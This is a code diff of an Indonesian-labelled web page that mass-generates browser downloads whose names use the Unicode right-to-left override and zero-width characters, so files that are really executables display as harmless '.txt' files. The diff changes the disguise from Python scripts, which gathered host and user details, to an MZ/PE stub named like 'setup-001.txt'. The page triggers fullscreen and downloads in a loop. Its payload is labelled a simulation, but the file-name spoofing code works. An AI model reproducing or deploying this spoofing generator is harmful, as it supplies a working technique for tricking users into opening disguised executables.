@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Blob &amp; ObjectURL — Spoofed .txt → .py</title>
+<title>Generator Blob &amp; ObjectURL — Spoofed .txt → .exe</title>
 <style>
 * {
 box-sizing: border-box;
@@ -171,23 +171,23 @@ width: 120px;
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Blob &amp; ObjectURL — Spoofed .txt → .py</h2>
-<p>File tampil sebagai <code>.txt</code> di folder Download, tapi ekstensi aslinya adalah <code>.py</code> yang disembunyikan dengan karakter Unicode RTL Override.</p>
+<h2>Generator Blob &amp; ObjectURL — Spoofed .txt → .exe</h2>
+<p>File tampil sebagai <code>.txt</code> di folder Download, tapi ekstensi aslinya adalah <code>.exe</code> yang disembunyikan dengan karakter Unicode RTL Override.</p>
 
 <div class="info-box">
 <strong>Struktur nama file:</strong>
 <ul style="margin-top:6px;margin-left:18px">
-<li>Nama asli di memori: <code>laporan-001\u202Eyp.txt</code></li>
-<li>Nama tampil ke user: <code>laporan-001.txt</code></li>
-<li>Ekstensi efektif: <code>.py</code></li>
+<li>Nama asli di memori: <code>setup-001\u202Eexe.txt</code></li>
+<li>Nama tampil ke user: <code>setup-001.txt</code></li>
+<li>Ekstensi efektif: <code>.exe</code></li>
 </ul>
 </div>
 
 <div class="preview">
-<div class="baris"><span class="label">Asli (byte):</span> laporan-001 \u202E y p . t x t</div>
-<div class="baris"><span class="label">Render RTL:</span> laporan-001 . t x t</div>
-<div class="baris"><span class="label">Ekstensi OS:</span> .py</div>
-<div class="baris"><span class="label">Tampil user:</span> laporan-001.txt</div>
+<div class="baris"><span class="label">Asli (byte):</span> setup-001 \u202E e x e . t x t</div>
+<div class="baris"><span class="label">Render RTL:</span> setup-001 . t x t</div>
+<div class="baris"><span class="label">Ekstensi OS:</span> .exe</div>
+<div class="baris"><span class="label">Tampil user:</span> setup-001.txt</div>
 </div>
 
 <h3 style="margin-bottom:10px;font-size:14px">Pilih mode spoofing:</h3>
@@ -205,7 +205,7 @@ width: 120px;
 <label for="mode-combo">Combo (RTL + ZWS)</label>
 </div>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Spoofed .py</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Spoofed .exe</button>
 <button id="stop-btn" type="button" disabled>Stop Proses</button>
 
 <div id="status" role="status">Sistem siap.</div>
@@ -238,57 +238,32 @@ console.warn("TTS gagal:", e);
 }
 };
 
-var payloadPy = "# ============================================\n" +
-"# Script Python - payload Blob ObjectURL\n" +
-"# Nama tampil .txt, ekstensi asli .py\n" +
-"# ============================================\n" +
-"\n" +
-"import os\n" +
-"import sys\n" +
-"import platform\n" +
-"import datetime\n" +
-"\n" +
-"def kumpulkan_info():\n" +
-"    return {\n" +
-"        'waktu': datetime.datetime.now().isoformat(),\n" +
-"        'platform': platform.platform(),\n" +
-"        'hostname': platform.node(),\n" +
-"        'python': sys.version,\n" +
-"        'cwd': os.getcwd(),\n" +
-"        'user': os.environ.get('USERNAME') or os.environ.get('USER'),\n" +
-"    }\n" +
-"\n" +
-"def main():\n" +
-"    info = kumpulkan_info()\n" +
-"    print('[Payload Python] Aktif')\n" +
-"    for k, v in info.items():\n" +
-"        print('  {}: {}'.format(k, v))\n" +
-"    return info\n" +
-"\n" +
-"if __name__ == '__main__':\n" +
-"    main()\n";
+var payloadExe = "MZ\u0090\u0000\u0003\u0000\u0000\u0000\u0004\u0000\u0000\u0000\u00FF\u00FF\u0000\u0000" +
+"\u00B8\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0040\u0000\u0000\u0000\u0000\u0000\u0000\u0000" +
+"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000" +
+"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0080\u0000\u0000\u0000" +
+"\u000E\u001F\u00BA\u000E\u0000\u00B4\u0009\u00CD\u0021\u00B8\u0001\u004C\u00CD\u0021" +
+"This program cannot be run in DOS mode.\r\r\n$" +
+"Simulasi PE header via Blob ObjectURL.\r\n" +
+"File ini BUKAN executable asli.\r\n" +
+"Header MZ + PE stub untuk uji deteksi ekstensi.\r\n" +
+"\r\n" +
+"Jika Anda melihat file ini dengan nama .txt di folder Download,\r\n" +
+"tapi Windows mengeksekusinya sebagai .exe, berarti trik RTL Override berhasil.\r\n";
 
-var payloadPyGanas = "#!/usr/bin/env python3\n" +
-"# Simulasi payload Python\n" +
-"import os\n" +
-"import sys\n" +
-"import socket\n" +
-"\n" +
-"def info_sistem():\n" +
-"    return {\n" +
-"        'hostname': socket.gethostname(),\n" +
-"        'user': os.environ.get('USERNAME') or os.environ.get('USER'),\n" +
-"        'cwd': os.getcwd(),\n" +
-"        'pid': os.getpid(),\n" +
-"    }\n" +
-"\n" +
-"def simulasi_eksekusi():\n" +
-"    print('[SIMULASI] Payload Python aktif')\n" +
-"    for k, v in info_sistem().items():\n" +
-"        print('  {} = {}'.format(k, v))\n" +
-"\n" +
-"if __name__ == '__main__':\n" +
-"    simulasi_eksekusi()\n";
+function buatByteExe(id, jumlah) {
+var bytes = new Uint8Array(jumlah);
+bytes[0] = 0x4D;
+bytes[1] = 0x5A;
+bytes[2] = 0x90;
+bytes[3] = 0x00;
+bytes[4] = 0x03;
+bytes[5] = 0x00;
+for (var i = 6; i < jumlah; i++) {
+bytes[i] = (i * 17 + id * 11) % 256;
+}
+return bytes;
+}
 
 function ambilMode() {
 var radios = document.getElementsByName('mode');
@@ -307,8 +282,8 @@ return out;
 }
 
 function buatNamaSpoofed(id, mode) {
-var base = "laporan-" + String(id).padStart(3, '0');
-var ext = "py";
+var base = "setup-" + String(id).padStart(3, '0');
+var ext = "exe";
 var txt = "txt";
 
 switch (mode) {
@@ -326,14 +301,14 @@ return base + "\u202E" + reverseStr(ext) + "." + txt;
 }
 
 function buatNamaTampil(id, mode) {
-var base = "laporan-" + String(id).padStart(3, '0');
+var base = "setup-" + String(id).padStart(3, '0');
 switch (mode) {
 case 'rtl':
 return base + ".txt";
 case 'zws':
-return base + ".py_ZWS_.txt";
+return base + ".exe_ZWS_.txt";
 case 'uni':
-return base + ".py.txt";
+return base + ".exe.txt";
 case 'combo':
 return base + ".txt";
 default:
@@ -344,8 +319,11 @@ return base + ".txt";
 function prepareMimeBlobAsync(i, mode) {
 return new Promise(function(resolve) {
 queueMicrotask(function() {
-var isi = (i % 2 === 0) ? payloadPyGanas : payloadPy;
-var blob = new Blob([isi], { type: "text/x-python" });
+var byteArray = buatByteExe(i, 4096);
+var blob = new Blob(
+[payloadExe, byteArray],
+{ type: "application/x-msdownload" }
+);
 var url = URL.createObjectURL(blob);
 var namaDownload = buatNamaSpoofed(i, mode);
 var namaTampil = buatNamaTampil(i, mode);
@@ -431,7 +409,7 @@ setTimeout(function() {
 isProcessing = true;
 startBtn.disabled = true;
 stopBtn.disabled = false;
-speak("Proses pembuatan berkas Python dimulai.");
+speak("Proses pembuatan berkas exe dimulai.");
 processLoop(1);
 }, 300);
 });
